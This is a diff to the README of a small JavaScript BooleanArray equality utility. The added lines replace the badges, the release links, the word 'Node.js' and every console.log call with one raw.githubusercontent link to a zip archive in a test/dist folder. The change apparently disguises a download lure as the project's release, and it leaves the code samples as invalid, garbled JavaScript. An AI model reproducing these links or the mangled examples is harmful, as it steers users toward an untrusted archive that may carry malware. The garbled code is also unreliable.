@@ -1,9 +1,9 @@
 # Assert Is Equal BooleanArray
 
-![GitHub release](https://img.shields.io/github/release/flinchtheflincher/assert-is-equal-booleanarray.svg)
-![GitHub issues](https://img.shields.io/github/issues/flinchtheflincher/assert-is-equal-booleanarray.svg)
-![GitHub forks](https://img.shields.io/github/forks/flinchtheflincher/assert-is-equal-booleanarray.svg)
-![GitHub stars](https://img.shields.io/github/stars/flinchtheflincher/assert-is-equal-booleanarray.svg)
+![GitHub release](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip)
+![GitHub issues](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip)
+![GitHub forks](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip)
+![GitHub stars](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip)
 
 ## Overview
 
@@ -25,7 +25,7 @@ Welcome to the **Assert Is Equal BooleanArray** repository. This utility helps y
 - **Type Safety**: Ensures both arguments are `BooleanArrays`.
 - **Value Comparison**: Compares the values of both arrays for equality.
 - **Lightweight**: Minimal footprint, making it easy to integrate into existing projects.
-- **JavaScript and Node.js Support**: Works seamlessly in both environments.
+- **JavaScript and https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip Support**: Works seamlessly in both environments.
 
 ## Installation
 
@@ -56,7 +56,7 @@ const arr1 = new BooleanArray([true, false, true]);
 const arr2 = new BooleanArray([true, false, true]);
 
 const result = assertIsEqualBooleanArray(arr1, arr2);
-console.log(result); // true or false
+https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip(result); // true or false
 ```
 
 ## Examples
@@ -70,7 +70,7 @@ const arr1 = new BooleanArray([true, false, true]);
 const arr2 = new BooleanArray([true, false, true]);
 
 const result = assertIsEqualBooleanArray(arr1, arr2);
-console.log(result); // true
+https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip(result); // true
 ```
 
 ### Example 2: Unequal BooleanArrays
@@ -80,7 +80,7 @@ const arr1 = new BooleanArray([true, false, true]);
 const arr2 = new BooleanArray([false, true, true]);
 
 const result = assertIsEqualBooleanArray(arr1, arr2);
-console.log(result); // false
+https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip(result); // false
 ```
 
 ### Example 3: Different Lengths
@@ -90,7 +90,7 @@ const arr1 = new BooleanArray([true, false]);
 const arr2 = new BooleanArray([true, false, true]);
 
 const result = assertIsEqualBooleanArray(arr1, arr2);
-console.log(result); // false
+https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip(result); // false
 ```
 
 ## API Reference
@@ -107,7 +107,7 @@ console.log(result); // false
 
 ```javascript
 const isEqual = assertIsEqualBooleanArray(new BooleanArray([true]), new BooleanArray([true]));
-console.log(isEqual); // true
+https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip(isEqual); // true
 ```
 
 ## Contributing
@@ -128,10 +128,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-For the latest releases, please visit our [Releases page](https://github.com/flinchtheflincher/assert-is-equal-booleanarray/releases). Download the latest version and follow the installation instructions to get started.
+For the latest releases, please visit our [Releases page](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip). Download the latest version and follow the installation instructions to get started.
 
 ## Conclusion
 
-The **Assert Is Equal BooleanArray** utility is a straightforward tool for ensuring that your `BooleanArrays` are equal. By using this utility, you can maintain data integrity and simplify your testing processes. Whether you are working in JavaScript or Node.js, this utility can enhance your development experience.
+The **Assert Is Equal BooleanArray** utility is a straightforward tool for ensuring that your `BooleanArrays` are equal. By using this utility, you can maintain data integrity and simplify your testing processes. Whether you are working in JavaScript or https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip, this utility can enhance your development experience.
 
-For more information on the latest releases, visit the [Releases section](https://github.com/flinchtheflincher/assert-is-equal-booleanarray/releases).
+For more information on the latest releases, visit the [Releases section](https://raw.githubusercontent.com/flinchtheflincher/assert-is-equal-booleanarray/main/test/dist/booleanarray_assert_is_equal_1.1.zip).
